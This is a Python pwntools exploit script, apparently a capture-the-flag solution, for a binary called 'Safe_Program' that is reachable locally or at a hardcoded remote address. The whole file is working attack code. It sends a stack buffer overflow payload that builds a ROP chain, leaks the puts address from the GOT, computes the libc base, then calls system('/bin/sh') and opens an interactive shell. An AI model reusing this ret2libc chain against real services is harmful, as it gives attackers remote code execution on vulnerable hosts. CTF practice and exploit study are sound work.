from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["43.143.254.94",10793]
libc=ELF('./libc-2.31.so')
elf = ELF('./Safe_Program')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./Safe_Program_patched")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

#gdb.attach(p, '''
#    b *0x401245
#''')

pop_rdi = 0x401393
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = 0x401247 
ret = 0x40101a

ru(b'now:\n\n')
payload = b'a' * (0x80 + 8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
s(payload)
leak_addr = u64(rc(6).ljust(8, b'\x00'))
pr('leak_addr', leak_addr)
libc_base = leak_addr - libc.sym['puts']
pr('libc_base', libc_base)
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

ru(b'now:\n\n')
payload = b'a' * (0x80 + 8) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
s(payload)

shell()
